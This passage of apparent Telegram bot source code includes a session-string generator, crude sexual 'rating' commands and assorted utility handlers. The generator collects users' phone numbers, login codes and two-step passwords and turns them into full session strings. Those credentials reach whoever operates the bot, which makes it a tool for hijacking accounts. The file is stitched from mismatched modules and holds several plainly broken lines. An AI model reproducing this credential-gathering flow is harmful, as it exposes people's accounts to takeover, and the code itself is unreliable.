    api_id_msg = await bot.ask(user_id, "sᴇɴᴅ ʏᴏᴜʀ **𝗔𝗣𝗜_𝗜𝗗** ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ.\n\nᴄʟɪᴄᴋ ᴏɴ /skip ғᴏʀ ᴜsɪɴɢ ʙᴏᴛ ᴀᴘɪ.", filters=filters.text)
    if await cancelled(api_id_msg):
        return
    if api_id_msg.text == "/skip":
        api_id = config.API_ID
        api_hash = config.API_HASH
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("**𝗔𝗣𝗜_𝗜𝗗** ᴍᴜsᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ, sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
            return
        api_hash_msg = await bot.ask(user_id, "» ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ **𝗔𝗣𝗜_𝗛𝗔𝗦𝗛**ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.", filters=filters.text)
        if await cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text
    if not is_bot:
        t = "» sᴇɴᴅ ʏᴏᴜʀ **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇғᴏʀ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ \nᴇxᴀᴍᴘʟᴇ : `+910000000000`'"
    else:
        t = "ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ʙᴏᴛ_ᴛᴏᴋᴇɴ** ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.\nᴇxᴀᴍᴩʟᴇ : `5432198765:arabaaplol`'"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    if not is_bot:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ sᴇɴᴅ ᴏᴛᴩ ᴀᴛ ᴛʜᴇ ɢɪᴠᴇɴ ɴᴜᴍʙᴇʀ...")
    else:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ ʟᴏɢɪɴ ᴠɪᴀ ʙᴏᴛ ᴛᴏᴋᴇɴ...")
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        await msg.reply("» ʏᴏᴜʀ **ᴀᴩɪ_ɪᴅ** ᴀɴᴅ **ᴀᴩɪ_ʜᴀsʜ** ᴄᴏᴍʙɪɴᴀᴛɪᴏɴ ᴅᴏᴇsɴ'ᴛ ᴍᴀᴛᴄʜ ᴡɪᴛʜ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴩᴩs sʏsᴛᴇᴍ. \n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        await msg.reply("» ᴛʜᴇ **ᴩʜᴏɴᴇ_ɴᴜᴍʙᴇʀ** ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ᴅᴏᴇsɴ'ᴛ ʙᴇʟᴏɴɢ ᴛᴏ ᴀɴʏ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ **ᴏᴛᴩ** ᴛʜᴀᴛ ʏᴏᴜ'ᴠᴇ ʀᴇᴄᴇɪᴠᴇᴅ ғʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ ᴏɴ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.\nɪғ ᴏᴛᴩ ɪs `12345`, **ᴩʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ᴀs** `1 2 3 4 5`.", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 10 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴡʀᴏɴɢ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴇxᴩɪʀᴇᴅ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
            try:
                two_step_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ **ᴛᴡᴏ sᴛᴇᴩ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ** ᴩᴀssᴡᴏʀᴅ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
                await two_step_msg.reply("» ᴛʜᴇ ᴩᴀssᴡᴏʀᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ᴡʀᴏɴɢ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
                return
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ :** @fuck_uff_XD \n★ **ɴᴏᴛᴇ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ʙᴇᴄᴀᴜsᴇ ʜᴇ ᴄᴀɴ ʜᴀᴄᴋ ʏᴏᴜʀ ᴀʟʟ ᴅᴀᴛᴀ. ★  "
    try:
        if not is_bot:
            await client.send_message("me", text)
        else:
            await bot.send_message(msg.chat.id, text)
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(msg.chat.id, "» sᴜᴄᴄᴇssғᴜʟʟʏ ɢʀɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\ɴᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇ ᴛᴏ ɢᴇᴛ ɪᴛ ! \n\nᴀ sᴛʀɪɴɢ  ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ @fuck_uff_XD ♦".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))


async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴩʀᴏᴄᴇss !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/restart" in msg.text:
        await msg.reply("**» sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇsᴛᴀʀᴛᴇᴅ ᴛʜɪs ʙᴏᴛ ғᴏʀ ʏᴏᴜ !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/skip" in msg.text:
        return False
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴘʀᴏᴄᴇss !**", quote=True)
        return True
    else:
        return False

BUTTON = [[Button.url("🍒 ꜱᴜᴘᴘᴏʀᴛ 🍒", "https://t.me/fuck_uff_XD")]]
HOT = "https://telegra.ph/file/daad931db960ea40c0fca.gif"
SMEXY = "https://telegra.ph/file/a23e9fd851fb6bc771686.gif"
LEZBIAN = "https://telegra.ph/file/5609b87f0bd461fc36acb.gif"
BIGBALL = "https://i.gifer.com/8ZUg.gif"
LANG = "https://telegra.ph/file/423414459345bf18310f5.gif"
CUTIE = "https://64.media.tumblr.com/d701f53eb5681e87a957a547980371d2/tumblr_nbjmdrQyje1qa94xto1_500.gif"
SIGMA = "https://te.legra.ph/file/7ff836ce726f9efce590c.mp4"


@bot.on(events.NewMessage(pattern="/horny ?(.*)"))
async def horny(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)}]"
    mm = random.randint(1, 100)
    HORNY = f"**🔥** {mention} **ɪꜱ** {mm}**% ʜᴏʀɴʏ!**"
    await e.reply(HORNY, buttons=BUTTON, file=HOT)


@bot.on(events.NewMessage(pattern="/gay ?(.*)"))
async def gay(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    GAY = f"**🍷** {mention} **ɪꜱ** {mm}**% ɢᴀʏ!**"
    await e.reply(GAY, buttons=BUTTON, file=SMEXY)


@bot.on(events.NewMessage(pattern="/lezbian ?(.*)"))
async def lezbian(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    FEK = f"**💜** {mention} **ɪꜱ** {mm}**% ʟᴇᴢʙɪᴀɴ!**"
    await e.reply(FEK, buttons=BUTTON, file=LEZBIAN)


@bot.on(events.NewMessage(pattern="/boob ?(.*)"))
async def boob(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    BOOBS = f"**🍒** {mention}**'ꜱ ʙᴏᴏʙꜱ ꜱɪᴢᴇ ɪᴢ** {mm}**!**"
    await e.reply(BOOBS, buttons=BUTTON, file=BIGBALL)


@bot.on(events.NewMessage(pattern="/cock ?(.*)"))
async def cock(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    COCK = f"**🍆** {mention}**'ꜱ ᴄᴏᴄᴋ ꜱɪᴢᴇ ɪᴢ** {mm}**ᴄᴍ**"
    await e.reply(COCK, buttons=BUTTON, file=LANG)


@bot.on(events.NewMessage(pattern="/cute ?(.*)"))
async def cute(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    CUTE = f"**🍑** {mention} {mm}**% ᴄᴜᴛᴇ**"
    await e.reply(CUTE, buttons=BUTTON, file=CUTIE)


@bot.on(events.NewMessage(pattern="/chad ?(.*)"))
async def chad(e):
    user_id = e.sender.id
    user_name = e.sender.first_name
    mention = f"[{user_name}](tg://user?id={str(user_id)})"
    mm = random.randint(1, 100)
    CHAD = f"**🔥** {mention} **ɪꜱ** {mm}**% ᴄʜᴀᴅ!**"
    await e.reply(CHAD, buttons=BUTTON, file=SIGMA)





# SHIVA MISHRA

@app.on_message(filters.command("alive"))
async def awake(_, message: Message):
    TEXT = f"**ʜᴇʏ {message.from_user.mention},\nɪ ᴀᴍ ʏᴜᴊɪ ɪᴛᴀᴅᴏʀɪ**\n━━━━━━━━━━━━━━━━━━━\n\n"
    TEXT += f"» **ᴍʏ ᴅᴇᴠᴇʟᴏᴘᴇʀ :** [ᴋɪɴɢ](tg://user?id=6647321265)\n\n"
    TEXT += f"» **ʟɪʙʀᴀʀʏ ᴠᴇʀsɪᴏɴ :** `{telever}` \n"
    TEXT += f"» **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ :** `{tlhver}` \n"
    TEXT += f"» **ᴘʏʀᴏɢʀᴀᴍ ᴠᴇʀsɪᴏɴ :** `{pyrover}` \n━━━━━━━━━━━━━━━━━\n"
    BUTTON = [
        [
          InlineKeyboardButton("sᴜᴘᴘᴏʀᴛ", url=f"https://t.me/fuck_uff_XD"),
        ]
    ]
    await message.reply_photo(
        photo=ALIVE_PIC,
        caption=TEXT,
        reply_markup=InlineKeyboardMarkup(BUTTON),
    )



def define(word: str):
    url = "http://urbandictionary.com/define.php?term=" + word
    response = get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    content = soup.find("div", {"class": "p-5 md:p-8"})
    word = content.find("div", class_="sm:flex sm:flex-row-reverse")
    meaning = content.find("div", class_="meaning my-4")

    return {"word": word.text, "meaning": meaning.text}


@app.on_message(filters.regex(r"(?i)^define (.*)$"))
def ok(client, m: Message):
    word = m.text.replace(m.text.split(" ")[0], "").strip()
    data = define(word)
    m.reply(f"**{data['word']}**\n\n{data['meaning']}")



def latest():

    url = 'https://subsplease.org/api/?f=schedule&h=true&tz=Japan'
    res = get(url).json()

    k = None
    for x in res['schedule']:
        title = x['title']
        time = x['time']
        try:
            aired = bool(x['aired'])
            title = f"**[{title}](https://subsplease.org/shows/{x['page']})**" if not aired else f"**~~[{title}](https://subsplease.org/shows/{x['page']})~~**"
        except KeyError:
            title = f"**[{title}](https://subsplease.org/shows/{x['page']})**"
        data = f"{title} - {time}"

        if k:
            k = f"{k}\n{data}"

        else:
            k = data

    return k


@app.on_message(filters.command('latest'))
def lates(_, message):
    mm = latest()
    message.reply_text(f"Today's Schedule:\nTZ: Japan\n{mm}")



@app.on_message(filters.command('paste'))
def pastex(_, message):
    text = message.reply_to_message
    if text:
        x = paste(text.text)
        message.reply(x,
                      reply_markup=InlineKeyboardMarkup(
                          [[InlineKeyboardButton("Open", url=x)]]),
                      disable_web_page_preview=True)

    else:
        message.reply_text("Reply to a message!")


@app.on_message(filters.command('id'))
def ids(_, message):
    reply = message.reply_to_message
    if reply:
        message.reply_text(
            f"**Your ID**: `{message.from_user.id}`\n**{reply.from_user.first_name}'s ID**: `{reply.from_user.id}`\n**Chat ID**: `{message.chat.id}`"
        )
    else:
        message.reply(
            f"**Your id**: `{message.from_user.id}`\n**chat id**: `{message.chat.id}`"
        )


HELPP_TEXT = """ʏᴏ, ʏᴜᴊɪ ɪᴛᴀᴅᴏʀɪ ʜᴇʀᴇ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ʙᴏᴛ written ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙʀᴀʀʏ 

ᴄʜᴇᴄᴋ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ʙᴜᴛᴛᴏɴs ғᴏʀ ᴍᴏʀᴇ ɪɴғᴏ 

ʀᴇᴘᴏʀᴛ ʙᴜɢs ᴀᴛ - @fuck_uff_XD"""


@app.on_message(filters.command('help') | filters.command('help@KomiSanRobot'))
def bothelp(_, message):
    if message.chat.type == "private":
        keyboard = []
        for x in help_message:
            keyboard.append([
                InlineKeyboardButton(f"{x['Module_Name']}",
                                     callback_data=f"help:{x['Module_Name']}")
            ])

        app.send_message(message.chat.id,
                         HELPP_TEXT,
                         reply_markup=InlineKeyboardMarkup(keyboard))

    else:
        app.send_photo(message.chat.id,
                       "https://telegra.ph/file/769474503795f6d4f406c.jpg",
                       caption=HELPP_TEXT,
                       reply_markup=InlineKeyboardMarkup([[
                           InlineKeyboardButton(
                               "Pm me for more details",
                               url="t.me/YuJi_ItAdOrI_RoBoT?start=help")
                       ]]))


@app.on_message(filters.command('ul'))
def ul(_, message):
    reply = message.reply_to_message
    if reply.media:
        i = message.reply("**Downloading....**")
        path = reply.download()
        fk = upload_file(path)
        for x in fk:
            url = "https://telegra.ph" + x

        i.edit(f'Your telegraph [link]({url})', disable_web_page_preview=True)

help_message.append({"Module_Name": "fun"}, )

help_message.append({"Module_Name": "telegraph"})

help_message.append({"Module_Name": "alive"})

help_message.append({"Module_Name": "sexsy"})

help_message.append({"Module_Name": "string"})

help_message.append({"Module_Name": "shayri"})

help_message.append({"Module_Name": "ban"})

help_message.append({"Module_Name": "unban"})

help_message.append({"Module_Name": "promote"})

help_message.append({"Module_Name": "pin"})

help_message.append({"Module_Name": "title"})

help_message.append({"Module_Name": "song"})

help_message.append({"Module_Name": "TagAll"})

class Help_Text:
    helpp = {
          "admin_help": """
➻ /ban - __reply to a user__
➻ /unban __user id or username__
➻ /pin - __reply to a message__
➻ /unpin - __reply to a message__
➻ /id - __to get the user id__
➻ /purge - __purge the messages__

""",
          "TagAll_help":"""
*Only for admins*

❍ /tagall or @all '(reply to message or add another message) To mention all members in your group, without exception.'
""",
          "string_help":"""
➻ /string - ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴜʀ sᴛʀɪɴɢ sᴇssɪᴏɴ
   """,
          "sexsy_help": """
➻ /horny - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ʜᴏʀɴʏᴇꜱꜱ

➻ /gay - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ɢᴜʏɴᴇꜱꜱ

➻ /lezbian - ᴄʜᴇᴄᴋ ᴜʀ ᴄᴜʀʀᴇɴᴛ ʟᴀᴢʙɪᴀɴ

➻ /boob - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ʙᴏᴏʙꜱ ꜱɪᴢᴇ

➻ /cute - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ᴄᴜᴛᴇɴᴇꜱꜱ

➻ /chad - ᴄʜᴇᴄᴋ ʜᴏᴡ ᴄʜᴀᴅ ʏᴏᴜ ᴀʀᴇ
""",
          "meme _help": """
➻ /rmeme - __to get random anime memes__
""",
          "alive_help": """
➻ /alive - __to check bot alive or not__
""",
          "notes_help": """
➻ /addnote note __name text - to add a note__\n•/delnote __NoteName - to delete a note__\n•/getnote __NoteName - get a note or use #notename__\n• /notes - __to get a list of notes in your chats__
""",
          "song_help": """ 
/song ᴛᴏ  ᴅᴏᴡɴʟᴏᴀᴅ   ᴀɴʏ  sᴏɴɢ  
/music ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴀɴʏ  sᴏɴɢ
""",
          "shayri_help":"""ꜱᴇɴᴅ ʀᴀɴᴅᴏᴍ ꜱʜᴀʏʀɪ
❍ /loveshayri : ʟᴏᴠᴇ ꜱʜᴀʏʀɪ
""",
          "ban_help":"""
➻ /ban - __[ reply to anyone message ] to ban anyone in your group__
""",
          "unban_help":"""
➻ /unban - __[ reply to anyone message ] to unban baned user in your group__
""",
          "pin_help":"""
➻ /pin - __pin messages in your group chats__
""",
          "title_help":"""
➻ /admintitle - __to change anyone admin title__
""",
          "promote_help":"""
➻ /promote - __to promote members in your group__
""",
          "extra_help": """• /watchorder __anime name - to get watchorder__
➻ /quote - __to get random anime quotes__
➻ /pat - __ to pat someone__
➻ /invitelink - __get invitelink of the current chat__
➻ /whatanime - __reply to a gif or video__
➻ /wall your query - __wallpapers__ 
➻ /paste - __reply to a message__
➻ define word - __get meaning of a word__

""",
          "welcome_help": """• /setwelcome __welcome message - text for welcome__
➻ /clearwelcome - __clear welcome message__""",
        "fun_help": """
➻ /eye - __check and see__
➻ /run - __check and see__
""",
         "telegraph_help": """• /ul - __Reply to a photo or video__""",
    }

fk = Help_Text()


def call_back_in_filter(data):
    return filters.create(lambda flt, _, query: flt.data in query.data,
                          data=data)


def is_admin(group_id: int, user_id: int):
    try:
        user_data = bot.get_chat_member(group_id, user_id)
        return bool(user_data.status == 'administrator'
                    or user_data.status == 'creator')
    except:
        # print('Not admin')
        return False


@app.on_callback_query(call_back_in_filter('help'))
def callback_help(_, query):

    if not query.data == "help":
        try:
            for x in help_message:
                module = query.data.split(':')[1]
                module_name = f'{module}_help'
                query.message.edit(fk.helpp.get(module_name),
                                   reply_markup=InlineKeyboardMarkup([[
                                       InlineKeyboardButton(
                                           "Back", callback_data="help:back")
                                   ]]))

            msg = query.message
            callback_module_name = query.data.split(':')[1]
            txt = helptext_

            query.message.edit(txt)
        except Exception as e:
            app.send_message(-1001954317013, f"error in help:\n\n{e}")

    if query.data == "help":
        keyboard = []
        for x in help_message:
            keyboard.append([
                InlineKeyboardButton(x['Module_Name'],
                                     callback_data=f"help:{x['Module_Name']}")
            ])

        query.message.edit(HELPP_TEXT,
                           reply_markup=InlineKeyboardMarkup(keyboard))

    if query.data.split(":")[1] == "back":
        keyboard = []
        for x in help_message:
            keyboard.append([
                InlineKeyboardButton(x['Module_Name'],
                                     callback_data=f"help:{x['Module_Name']}")
            ])
        try:
            query.message.edit(HELPP_TEXT,
                               reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            pass


@app.on_message(filters.command("info"))
def info(_, message):
    if message.text == "/info":
        user = message.from_user.id
    if message.reply_to_message:
        user = message.reply_to_message.from_user.id
    if not message.reply_to_message and message.text != "/info" and user.isnumeric(
    ):
        user = message.text.split(" ")[1]

    if not message.reply_to_message and message.text != "/info" and not user.isnumeric(
    ):
        k = app.get_users(message.text.split(" ")[1])
        user = k.id

    if user == OWNER:
        status = "This Person is my Owner"

    elif user in sudos:
        status = "This person is one of my Sudo users !"

    else:
        status = "member"

    pfp_count = app.get_profile_photos_count(user)

    if not pfp_count == 0:
        pfp = app.get_profile_photos(user, limit=1)
        pfp_ = pfp[0]['thumbs'][0]['file_id']

    foo = app.get_users(user)
    data = f"""**First Name** : {foo.first_name}
**Last Name**: {foo.last_name}
**Telegram Id**: {foo.id}
**PermaLink**: {foo.mention(foo.first_name)}
**is_bot**: {foo.is_bot}
**Status**: {status}
"""

    if pfp_count != 0:
        message.reply_photo(pfp_, caption=data)

    else:
        message.reply_text(data)


sudos = [6647321265]

print("yooo babe im alive.")

app.run()
